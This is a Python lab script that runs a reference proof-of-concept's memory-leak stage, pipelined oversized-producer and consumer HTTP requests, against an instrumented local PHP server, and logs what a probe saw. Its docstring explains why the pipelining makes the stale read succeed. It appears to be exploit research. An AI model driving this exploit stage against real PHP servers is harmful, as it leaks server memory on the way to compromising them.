#!/usr/bin/env python3
"""Run the reference PoC's *own* request pipeline against the instrumented lab.

Why this experiment
-------------------
step4 held the pad fixed and swept consumer geometry one request at a time.
step4_occupy.py:22 states the sweep sends "producer, consumer" - one consumer
per producer. Reading the reference PoC shows that is not what it does:

    run_leak_stage() sends ONE sendall carrying 9 HTTP requests on a single
    keep-alive connection: 1 OOM producer + CONSUMERS(8) consumers, all written
    before any response is read.

That pipelining is not a convenience. Writing all eight consumers before reading
narrows the window in which another request could take the poisoned worker, and
it means the stale read gets eight chances to land - against our one. So the
earlier "different request shape" hypothesis in ANALYSIS 10.5(d) is wrong on the
facts: P.leak_producer and P.code_consumer are byte-identical to the bodies we
have been sending (verified: 251,557 B and 92,388 B, byte-equal). The difference
is the number of consumer requests per poisoned worker and their pipelining.

This script sends the PoC's exact byte stream to our instrumented php -S and
reports, for each of the 8 consumer responses, what the A0 probe saw.

Usage: step5_pipeline.py [--reps N]
"""
import io
import json
import os
import re
import sys
import time

sys.path[:0] = ["/opt/data/php2shell-lab", "/opt/data/lab-scratch",
                "/tmp/StealMyBitcoin-PoC"]
import stealmybitcoin_poc as P            # noqa: E402
import step4_reach as R                   # noqa: E402

OUT = "/opt/data/lab-scratch/pipeline.log"
EVID = "/opt/data/lab-scratch/pipeline-logs"

A0 = re.compile(
    r"\[INSTR-A0\] entry PS\(id\)=0x([0-9a-f]+) val=0x([0-9a-f]+) len=(\d+) "
    r"gc_refcount=(\d+) gc_type=0x([0-9a-f]+) send_cookie=(\d+) headers_sent=(\d+)")
BYTES = re.compile(r"\[INSTR-A0\] bytes\((\d+)\): ((?:[0-9a-f]{2} ?)+)")


def a0_records(path, start):
    """Parse A0 records appended to the server log since `start`."""
    data = io.open(path, "rb").read()[start:]
    text = data.decode("latin-1")
    recs = []
    cur = None
    for line in text.splitlines():
        m = A0.search(line)
        if m:
            cur = dict(addr=int(m.group(1), 16), val=int(m.group(2), 16),
                       len=int(m.group(3)), rc=int(m.group(4)),
                       gctype=int(m.group(5), 16), send_cookie=int(m.group(6)),
                       headers=int(m.group(7)), bytes=None)
            recs.append(cur)
            continue
        b = BYTES.search(line)
        if b and cur is not None and cur["bytes"] is None:
            cur["bytes"] = bytes.fromhex(b.group(2).replace(" ", ""))
    return recs


def cookie_from(record):
    """Set-Cookie PHPSESSID value from a raw HTTP response record."""
    headers = record.get("headers") or []
    for name, value in headers:
        if name.lower() == "set-cookie" and "PHPSESSID=" in value:
            raw = value.split("PHPSESSID=", 1)[1].split(";", 1)[0]
            return raw.encode("latin-1", "replace")
    return b""


def main():
    reps = 3
    if "--reps" in sys.argv:
        reps = int(sys.argv[sys.argv.index("--reps") + 1])
    os.makedirs(EVID, exist_ok=True)
    stage = P.STAGES["code"]
    print("stage=%s producer=%d consumer=%d consumers_per_producer=%d"
          % (stage.name, len(P.leak_producer(stage.producer)),
             len(stage.build_consumer()), P.CONSUMERS))
    print("bodies byte-equal to lab bodies: producer=%s consumer=%s"
          % (P.leak_producer(stage.producer) == __import__("step4_fitsweep").producer(
              __import__("step4_fitsweep").PGEO, b"\x00"),
             stage.build_consumer() == __import__("step4_occupy").consumer2(
              b"a", 73, 69, 16, 16, 24)))
    wins = 0
    for rep in range(reps):
        port = 19100 + rep
        srv = R.start_server(port)
        try:
            target = P.Target(scheme="http", host="127.0.0.1", port=port, path="/")
            size0 = os.path.getsize(R.LOG)
            outdir = os.path.join(EVID, "rep%d" % rep)
            os.makedirs(outdir, exist_ok=True)
            from pathlib import Path
            result = None
            try:
                cand = P.run_leak_stage(target, stage, Path(outdir))
                result = "LEAK candidate=%#x" % cand
                wins += 1
            except RuntimeError as exc:
                result = "no-leak (%s)" % str(exc)[:110]
            time.sleep(0.4)
            recs = a0_records(R.LOG, size0)
            json.dump([dict(r, bytes=r["bytes"].hex() if r["bytes"] else None)
                       for r in recs],
                      open(os.path.join(outdir, "a0.json"), "w"), indent=1)
            print("\n== rep %d port %d : %s" % (rep, port, result))
            for i, r in enumerate(recs):
                bs = r["bytes"]
                preview = " ".join("%02x" % x for x in bs[:16]) if bs else "-"
                print("   A0[%d] addr=%#x len=%-12d sc=%d hs=%d type=0x%x bytes=%s%s"
                      % (i, r["addr"], r["len"], r["send_cookie"], r["headers"],
                         r["gctype"], preview, " ..." if bs and len(bs) > 16 else ""))
        finally:
            R.stop_server(srv)
    print("\n=== pipeline done reps=%d leaks=%d ===" % (reps, wins))
    io.open(OUT, "a", encoding="utf-8").write(
        "pipeline reps=%d leaks=%d %s\n" % (reps, wins, time.strftime("%F %T")))
    return 0


if __name__ == "__main__":
    sys.exit(main())
